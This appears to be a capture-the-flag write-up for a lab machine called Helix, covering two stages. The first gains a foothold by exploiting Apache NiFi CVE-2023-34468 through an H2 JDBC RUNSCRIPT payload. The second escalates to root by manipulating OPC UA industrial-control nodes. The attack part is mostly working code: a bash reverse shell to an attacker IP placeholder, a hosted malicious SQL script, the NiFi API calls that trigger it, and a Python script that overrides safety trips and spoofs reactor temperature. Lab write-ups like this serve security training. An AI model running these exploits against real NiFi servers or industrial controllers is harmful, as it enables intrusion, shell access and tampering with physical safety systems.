03

Foothold — Apache NiFi RCE (CVE-2023-34468)

Browsing to flow.helix.htb revealed an Apache NiFi 1.21.0 instance with anonymous write access enabled — no authentication required. This version is vulnerable to CVE-2023-34468, which abuses the H2 database JDBC driver via the DBCPConnectionPool controller service to execute arbitrary SQL including RUNSCRIPT, achieving remote code execution.

Preparing the payload:

mkdir ~/helix && cd ~/helix
ATTACKER_IP="<KALI_VPN_IP>"

cat > rce.sql << EOF
CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String cmd) throws Exception {
    Runtime rt = Runtime.getRuntime();
    String[] commands = new String[]{"/bin/bash","-c",cmd};
    Process proc = rt.exec(commands);
    return "";
} $$;
CALL EXEC('bash -c "bash -i >& /dev/tcp/<KALI_VPN_IP>/4444 0>&1"');
EOF

python3 -m http.server 8080

Exploiting via the NiFi API:

# Get root process group ID
PG_ID=$(curl -s "http://flow.helix.htb/nifi-api/flow/process-groups/root" | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['processGroupFlow']['id'])")

# Create malicious DBCPConnectionPool controller service
CS_RESP=$(curl -s -X POST "http://flow.helix.htb/nifi-api/process-groups/$PG_ID/controller-services" \
  -H "Content-Type: application/json" \
  -d '{
    "revision": {"version": 0},
    "component": {
      "type": "org.apache.nifi.dbcp.DBCPConnectionPool",
      "name": "PwnPool",
      "properties": {
        "Database Connection URL": "jdbc:h2:mem:pwn;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '\''http://<KALI_VPN_IP>:8080/rce.sql'\''",
        "Database Driver Class Name": "org.h2.Driver",
        "database-driver-locations": "/opt/nifi-1.21.0/lib/h2-2.1.214.jar",
        "Database User": "sa",
        "Password": "sa"
      }
    }
  }')

CS_ID=$(echo $CS_RESP | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

# Enable the controller service
curl -s -X PUT "http://flow.helix.htb/nifi-api/controller-services/$CS_ID/run-status" \
  -H "Content-Type: application/json" \
  -d '{"revision":{"version":1},"state":"ENABLED"}'

# Create ExecuteSQL processor
PROC_RESP=$(curl -s -X POST "http://flow.helix.htb/nifi-api/process-groups/$PG_ID/processors" \
  -H "Content-Type: application/json" \
  -d "{
    \"revision\": {\"version\": 0},
    \"component\": {
      \"type\": \"org.apache.nifi.processors.standard.ExecuteSQL\",
      \"name\": \"Pwn\",
      \"position\": {\"x\": 200, \"y\": 200},
      \"config\": {
        \"properties\": {
          \"Database Connection Pooling Service\": \"$CS_ID\",
          \"SQL select query\": \"SELECT 1\"
        },
        \"autoTerminatedRelationships\": [\"success\",\"failure\"]
      }
    }
  }")

# Start the processor — triggers the exploit
curl -s -X PUT "http://flow.helix.htb/nifi-api/processors/$PROC_ID/run-status" \
  -H "Content-Type: application/json" \
  -d "{\"revision\":{\"version\":1},\"state\":\"RUNNING\"}"

Result: reverse shell received as nifi.

Key notes:

  • The correct H2 jar path is /opt/nifi-1.21.0/lib/h2-2.1.214.jar (not /usr/local/nifi/...)
  • Password field cannot be empty — use the default "sa"
  • Wait for controller service state to reach ENABLED before starting the processor
Why this matteredNiFi's controller-service model lets an authenticated (or here, anonymous-write) user define a JDBC connection string outright — and H2's INIT=RUNSCRIPT FROM option turns "configure a database connection" into "fetch and execute arbitrary SQL from a URL I control," with CREATE ALIAS as the bridge from SQL into a real OS process.

05

Privilege Escalation — OPC UA Abuse

sudo -l
# (root) NOPASSWD: /usr/local/sbin/helix-maint-console
ss -tlnp

Port 4840 was listening on localhost — an OPC UA industrial server.

cat /usr/local/sbin/helix-maint-console

The script checks for a file at /opt/helix/state/maintenance_window containing a future Unix timestamp. If present and valid, it launches an interactive root shell via systemd-run.

The internal HMI on port 8081 revealed the system architecture:

curl -s http://127.0.0.1:8081/

Key information from the HMI: Temperature, Pressure, TripActive, Mode, and TestOverride nodes are visible; the maintenance window opens when hazardous test conditions are detected; the safety controller (running as root) writes the maintenance window file.

ssh -i ~/helix/operator_id_ed25519 -L 4840:127.0.0.1:4840 operator@<TARGET_IP> -N
python3 -m venv ~/helix/venv
source ~/helix/venv/bin/activate
pip install opcua

Browsing the OPC UA namespace revealed all nodes: TemperatureRaw, Temperature, Pressure, CalibrationOffset, RodsInserted, EmergencyCooling, TripActive, Mode, TestOverride, and ResetTrip.

The key insight: setting the Mode node directly to MAINTENANCE via OPC UA triggers the safety controller to write the maintenance window file.

from opcua import Client
import time

client = Client("opc.tcp://127.0.0.1:4840")
client.connect()

calibration  = client.get_node("ns=2;i=6")
mode_node    = client.get_node("ns=2;i=12")
override     = client.get_node("ns=2;i=13")
reset        = client.get_node("ns=2;i=14")
temperature  = client.get_node("ns=2;i=4")
trip         = client.get_node("ns=2;i=10")

# Reset everything
calibration.set_value(0.0)
override.set_value(False)
reset.set_value(True)
time.sleep(2)
reset.set_value(False)
time.sleep(3)

# Set Mode to MAINTENANCE
mode_node.set_value("MAINTENANCE")

# Enable override and raise temperature safely
override.set_value(True)
time.sleep(2)
calibration.set_value(15.0)  # Pushes temp to ~299°C

print("[+] MAINTENANCE MODE ACTIVE!")
client.disconnect()

While the OPC UA script runs, spam the maintenance console:

for i in {1..60}; do
  sudo /usr/local/sbin/helix-maint-console && break
  sleep 1
done
[+] Privileged maintenance access granted
[!] Window expires in 119 seconds
root@helix:/home/operator# cat /root/root.txt
Root Flag
Why this matteredThe privilege boundary here isn't a bug in the traditional sense — it's a legitimate safety mechanism (a maintenance window for hazardous conditions) that trusts any caller able to set the right OPC UA node values, with no separate authorization check on who's allowed to declare "we're in maintenance mode."
